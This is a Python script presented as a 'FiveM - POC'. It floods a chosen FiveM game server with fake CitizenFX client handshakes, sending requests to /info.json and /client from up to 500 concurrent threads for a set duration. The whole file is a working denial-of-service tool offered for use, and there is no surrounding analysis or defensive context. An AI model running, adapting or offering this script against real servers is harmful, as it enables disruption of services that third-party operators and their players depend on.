import requests
import threading
import uuid
import time
import sys

if len(sys.argv) != 5:
    print("FiveM - POC, Invalid usage...")
    print("Usage: python3 script.py <IP> <PORT> <SafeMode(True/False)> <DurationInSeconds>")
    exit()

ip = sys.argv[1]
port = sys.argv[2]
safe_mode = sys.argv[3].lower() == "true"
end_time = time.time() + int(sys.argv[4])

def worker(ip, port, end_time):
    try:
        session = requests.Session()
        token = str(uuid.uuid4())

        client_headers = {
            "Host": f"{ip}:{port}",
            "User-Agent": "CitizenFX",
            "Accept": "*/*"
        }

        post_headers = {
            "Host": f"{ip}:{port}",
            "User-Agent": "CitizenFX/1",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        post_data = {
            "method": "getEndpoints",
            "token": token
        }

        while time.time() < end_time:
            try:
                # Step 1
                r = session.get(f"http://{ip}:{port}/info.json", headers=client_headers, timeout=5)
                if r.status_code == 200:
                    print("(1/4) [NO_PROXY] -> Init Client Request!")
                else:
                    print(f"_FAILED_ (1/4) [NO_PROXY] -> Status: {r.status_code}")
                    if safe_mode:
                        break

                # Step 2
                r = session.post(f"http://{ip}:{port}/client", headers=post_headers, json=post_data, timeout=5)
                if r.status_code == 200:
                    print("(2/4) [NO_PROXY] -> Posted Client Data!")
                else:
                    print(f"_FAILED_ (2/4) [NO_PROXY] -> Status: {r.status_code}")
                    if safe_mode:
                        break

                # Step 3
                client_headers["User-Agent"] = "CitizenFX/1"
                r = session.get(f"http://{ip}:{port}/info.json", headers=client_headers, timeout=5)
                if r.status_code == 200:
                    print("(3/4) [NO_PROXY] -> Init Client Request 2!")
                else:
                    print(f"_FAILED_ (3/4) [NO_PROXY] -> Status: {r.status_code}")
                    if safe_mode:
                        break

                # Step 4
                post_data["X-CitizenFX-Token"] = token
                post_data["method"] = "getConfiguration"
                post_headers["User-Agent"] = "CitizenFX/1"
                r = session.post(f"http://{ip}:{port}/client", headers=post_headers, json=post_data, timeout=5)
                if r.status_code == 200:
                    print("(4/4) [NO_PROXY] -> Posted Client Data Config!")
                else:
                    print(f"_FAILED_ (4/4) [NO_PROXY] -> Status: {r.status_code}")
                    if safe_mode:
                        break

                # Final step
                client_headers["User-Agent"] = "curl/7.83.1-DEV"
                r = session.get(f"http://{ip}:{port}/info.json", headers=client_headers, timeout=5)
                if r.status_code == 200:
                    print("(Final) [NO_PROXY] -> Init Client Request Success!")
                else:
                    print(f"_FAILED_ (Final) [NO_PROXY] -> Status: {r.status_code}")
                    if safe_mode:
                        break

                session.close()
                break

            except requests.RequestException as e:
                print("__Error__ Request failed!", e)
                break

    except Exception as e:
        print("__Error__ General exception!", e)

# Starte Threads
while True:
    if threading.active_count() < 500:
        threading.Thread(target=worker, args=(ip, port, end_time)).start()
